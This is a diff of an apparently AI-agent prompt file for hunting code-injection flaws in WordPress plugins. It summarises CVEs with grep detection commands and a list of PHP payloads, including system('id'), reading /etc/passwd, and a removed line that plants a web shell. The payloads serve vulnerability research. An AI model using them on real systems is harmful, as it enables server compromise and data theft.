@@ -171,82 +171,21 @@ function block_logic_check_logic($logic) {
 **Why vulnerable:** Block attributes are saved in post content by contributors. The `blockLogic` attribute flows directly into `eval()` with no sanitization — just `stripslashes` and `trim`. Fix: replaced eval with custom tokenizer + function allowlist using `call_user_func_array()` on safe WP functions only.
 **Detection:** `grep -rn 'eval\s*(' --include='*.php'` then trace input to block/widget/shortcode attributes.
 
-### CVE-2025-9321: WPCasa — Dynamic Class Instantiation from Query Var
-**Impact:** Unauthenticated, CVSS 9.8
-
-```php
-// Query variable directly used to instantiate class
-$type = get_query_var('property_type');
-$handler = new $type($args);  // Attacker controls class name!
-// URL: /?property_type=SomeClass → instantiates ANY loaded class
-```
-
-**Why vulnerable:** `new $class()` with user-controlled `$class` lets attacker instantiate any auto-loaded class. Dangerous classes with side effects in constructors (file ops, DB queries, code execution) become weapons. Fix: empty allowlist via `apply_filters()` — rejects all values by default.
-**Detection:** `grep -rn 'new \$' --include='*.php'` + trace variable to user input (query vars, POST, shortcode attrs).
-
-### CVE-2025-13035: Code Snippets — extract() Overwrites eval() Input
-**Impact:** Contributor+, CVSS 8.0
-
-```php
-function evaluate_shortcode_from_db($snippet, $atts) {
-    extract($atts);              // Overwrites $snippet with attacker's value!
-    ob_start();
-    eval("?>\n\n" . $snippet->code);  // Now uses attacker's $snippet->code
-    return ob_get_clean();
-}
-// Attack: shortcode with attr name 'snippet' → overwrites the $snippet parameter
-```
-
-**Why vulnerable:** `extract($atts)` without `EXTR_SKIP` flag overwrites existing local variables. Attacker names a shortcode attribute `snippet` which overwrites the `$snippet` parameter, controlling what eval() executes. Fix: `extract($atts, EXTR_SKIP)` — existing variables preserved.
-**Detection:** `grep -rn 'extract\s*(' --include='*.php'` — check if any extracted variables flow into eval/include/require.
+- **CVE-2025-9321 (WPCasa, 9.8):** `new $type()` with user-controlled query var → arbitrary class instantiation. Detect: `grep -rn 'new \$' --include='*.php'`
+- **CVE-2025-13035 (Code Snippets, 8.0):** `extract($atts)` without EXTR_SKIP overwrites var flowing into `eval()`. Detect: `grep -rn 'extract\s*(' --include='*.php'`
 
 ---
 
 ## Attack Techniques
 
-### 1. Basic eval/assert Injection
-```php
-// If eval() is reachable with user input
-// Payload: system('id')
-// Or: file_get_contents('/etc/passwd')
-// Or: $a=base64_decode('c3lzdGVtKCdpZCcp');eval($a);
-```
+Standard payloads: `callback=system&arg=id` (callback injection), `system('id')` (eval), `method=__destruct` (dynamic dispatch), `replace=system('id')` (preg_replace /e), `callback=system&data[]=id` (array_map).
 
-### 2. Callback Injection
-```php
-// If call_user_func($callback, $arg) where $callback is controllable
-// Payload: callback=system&arg=id
-// Or: callback=passthru&arg=cat /etc/passwd
-// Or: callback=file_put_contents&arg[]=/tmp/shell.php&arg[]=<?php system($_GET[c]);?>
-```
-
-### 3. Dynamic Method Dispatch
-```php
-// If $this->$method() where $method is controllable
-// Try calling: __destruct, __toString, or any public method
-// If the class has a method like execute($cmd), call that
-```
-
-### 4. preg_replace /e Exploitation
-```php
-// Legacy code with /e modifier
-// Pattern: preg_replace('/.*/e', $_POST['replace'], 'anything')
-// Payload: replace=system('id')
-// The replacement is eval'd as PHP code
-```
-
-### 5. extract() Variable Overwrite
+### extract() Variable Overwrite (WordPress-common)
 ```php
 // If extract($_POST) is followed by eval($template) or similar
 // Send: template=system('id') via POST
 // The extract() overwrites $template, then eval() executes it
-```
-
-### 6. Array Function Callback
-```php
-// If array_map($callback, $data) where $callback is controllable
-// Payload: callback=system&data[]=id
-// array_map('system', ['id']) → executes system('id')
+// Common in shortcode handlers: extract($atts) without EXTR_SKIP
 ```
 
 ---
@@ -311,22 +250,6 @@ wpguard_sandbox_request(
 
 ## Finding Creation
 
-**IMPORTANT: Every finding description MUST include a `## Prerequisites` section** using this exact structured format. Every field must be explicitly filled — no omissions, no vague descriptions.
-
-```markdown
-## Prerequisites
-- **Base plugins:** [WooCommerce 8.0+] or [None]
-- **Plugin settings:** [Settings > Uploads > Enable file uploads = ON] or [Default settings]
-- **Required content:** [At least one published product with featured image] or [None]
-- **Required roles/users:** [WooCommerce `customer` role] or [Default WordPress roles]
-- **WordPress config:** [Multisite enabled] or [Standard single-site]
-- **Sandbox setup steps:**
-  1. `wpguard_sandbox_install_plugin(slug="woocommerce")` or [None — no extra setup]
-```
-
-Every field MUST have either a specific value or an explicit "[None]" / "[Default ...]". Vague entries like "check plugin settings" will be rejected by QA.
-
-
 ```python
 wpguard_finding_create(
     plugin_slug="example-plugin",
@@ -334,33 +257,16 @@ wpguard_finding_create(
     active_installs=50000,
     vuln_type="code_injection",
     title="Remote Code Execution via call_user_func() Callback Injection",
-    description="""
-## Vulnerability Summary
-User-controlled callback parameter passed to call_user_func() allows arbitrary PHP function execution.
+    description="""## Vulnerability Summary
+User-controlled callback passed to call_user_func() allows arbitrary PHP function execution.
 
 ## Data Flow
 Entry: AJAX action "execute_callback" (subscriber+)
-  ↓
-Input: $_POST['callback'] and $_POST['args']
-  ↓
-Processing: sanitize_text_field($_POST['callback']) — does NOT prevent function names
-  ↓
-Sink: call_user_func($callback, $args)
-  ↓
-Impact: Arbitrary PHP function execution (system, exec, passthru, etc.)
+Input: $_POST['callback'] → sanitize_text_field (does NOT block function names)
+Sink: call_user_func($callback, $args) → system('id')
 
 ## Prerequisites
-None — works with default plugin settings.
-
-## Exploitation
-1. Login as subscriber
-2. POST to admin-ajax.php: action=execute_callback&callback=system&args=id
-3. Server executes system('id') — full RCE
-
-## Impact
-- Remote Code Execution
-- Full server compromise
-- Data exfiltration
+None — default plugin settings.
     """,
     auth_level="subscriber",
     cvss_score=8.8,
@@ -385,69 +291,4 @@ Admin-only code injection: 4.7 Medium (usually not in scope)
 
 ---
 
-## Dynamic Validation REQUIRED
-
-**You MUST test findings in the sandbox before saving.** Static analysis alone is not sufficient.
-
-- **`status="validated"`** — ONLY if you performed a `wpguard_sandbox_request()` that confirms the vulnerability (e.g., injected code executed, eval/call_user_func triggered with attacker input, observable side effect confirms execution)
-- **`status="draft"`** — If static analysis is promising but sandbox testing was inconclusive, failed, or you ran out of turns. Include what you tried and what happened.
-
-**Never save a finding as "validated" based on code reading alone.** A promising code path that fails dynamic testing is a draft, not a finding. This prevents false positives from wasting the entire downstream pipeline (PoC Writer → PoC Runner → QA).
-
----
-
-## Progress Saving (CRITICAL)
-
-**Save findings IMMEDIATELY as you discover them — do NOT accumulate findings in memory.**
-
-1. The moment you identify a vulnerability, call `wpguard_finding_create()` right away
-2. If unsure, create it as `status="draft"` — drafts are reviewed by QA, never lost
-3. Do NOT wait until the end to report — if you run out of context, unsaved findings are LOST
-4. The PM and poc-writer will handle PoC scripts — your job is to find vulns and save them
-
-### Progress Report (REQUIRED before finishing)
-
-Before your final response to the PM, save a progress report to `reports/{plugin_slug}/progress_{agent_name}.md` with:
-
-```markdown
-# Progress Report: {agent_name} on {plugin_slug}
-
-## Files Analyzed
-- [x] includes/ajax.php — fully analyzed
-- [x] includes/admin.php — fully analyzed
-- [ ] includes/api.php — partially analyzed (stopped at line 250)
-- [ ] lib/import.php — NOT analyzed
-
-## Findings Created
-- {finding_id}: {title} (status: {draft/validated})
-
-## Remaining Work
-- includes/api.php lines 250+ — has register_rest_route calls not yet reviewed
-- lib/import.php — contains unserialize() call, needs full trace
-- All shortcode handlers in includes/shortcodes/ — not yet checked
-
-## Notes
-- {any patterns observed, areas that looked promising but need more time}
-```
-
-**Why this matters:** If you run out of context, the PM will relaunch you (or another expert) with this progress report so analysis continues from where you left off instead of restarting from scratch.
-
----
-
-## When Finished
-
-Report all findings back to the PM. For each finding, include:
-- Vulnerability type, affected file/function/line
-- Data flow (entry point → processing → sink)
-- Authentication level required
-- Suggested CVSS score and vector
-- Whether exploitation was verified or if it's a draft finding (static analysis only)
-
-Also report:
-- **Progress report saved:** `reports/{plugin_slug}/progress_{agent_name}.md`
-- **Analysis complete:** YES / PARTIAL (ran out of context — {N} files remain)
-- If PARTIAL, list the most promising unanalyzed areas so the PM can relaunch
-
-The PM will coordinate the PoC Writer and verification pipeline.
-
-**Remember: The vulnerability IS there. Your job is to find it. Don't give up.**
+{{include:_expert-shared.md|validation_example=injected code executed, eval/call_user_func triggered with attacker input, observable side effect confirms execution}}
